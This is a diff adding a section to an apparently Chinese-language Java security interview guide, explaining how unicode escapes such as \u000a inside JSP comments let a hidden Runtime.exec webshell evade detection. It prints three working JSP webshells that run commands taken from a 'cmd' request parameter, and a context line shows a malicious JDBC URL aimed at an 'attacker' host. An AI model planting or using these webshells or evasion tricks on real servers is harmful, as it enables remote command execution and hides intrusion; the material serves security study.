@@ -323,3 +323,35 @@ jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.Server
 （4）自定义类加载器绕过
 
 （5）通过`JNI`调用`native`方法绕过
+
+
+
+### 是否了解利用unicode特性的JSP Webshell绕过（★★★）
+
+编译`JSP`时其中的`unicode`会进行解码，其中`\u000a`变成换行，导致后面的`exec`可以执行
+
+```java
+<%
+  Runtime.getRuntime().
+  //\u000aexec
+  (request.getParameter("cmd"));
+%>
+```
+
+加入转义符将会变成简单的注释，这将变成普通的`webshell`
+
+```java
+<%
+  Runtime.getRuntime().
+  //\\u000axxxxxx
+  exec(request.getParameter("cmd"));
+%>
+```
+
+一种特殊的方式（原理较复杂暂不分析）
+
+```java
+<%
+  Runtime.getRuntime().
+  //\u000d\uabcdexec(request.getParameter("cmd"));
+%>
